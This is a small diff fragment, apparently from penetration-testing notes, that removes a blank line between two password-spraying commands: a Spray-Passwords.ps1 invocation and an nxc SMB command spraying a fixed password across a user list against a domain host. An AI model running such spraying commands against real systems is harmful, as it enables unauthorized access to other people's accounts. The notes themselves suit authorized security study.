@@ -21,7 +21,6 @@ using spray passwords (in resources)
 .\Spray-Passwords.ps1 -Pass password123! -Admin
 ```
 
-
 using nxc
 ```powershell
 nxc smb 192.168.0.25 -u users.txt -p 'password123' -d corp.ad.com --continue-on-success
